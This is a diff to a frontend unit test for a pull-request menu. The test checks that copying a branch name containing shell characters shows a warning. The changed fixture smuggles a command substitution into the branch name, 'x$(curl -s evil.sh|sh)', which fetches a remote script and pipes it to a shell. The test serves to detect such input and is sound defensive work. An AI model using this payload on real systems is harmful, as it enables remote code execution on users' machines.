@@ -59,7 +59,7 @@ describe('PrMenu', () => {
   it('warns when the copied branch name could run something in a shell', async () => {
     const writeText = vi.fn(async () => undefined);
     vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } });
-    open({ headRefName: 'x$(curl${IFS}evil|sh)' });
+    open({ headRefName: 'x$(curl -s evil.sh|sh)' });
     fireEvent.click(item(/^Copy branch name/));
     await waitFor(() => expect(toasts.value[0]?.message).toMatch(/contains shell characters/));
     expect(isRiskyBranchName('feature/a.b_c-1+2@x')).toBe(false);
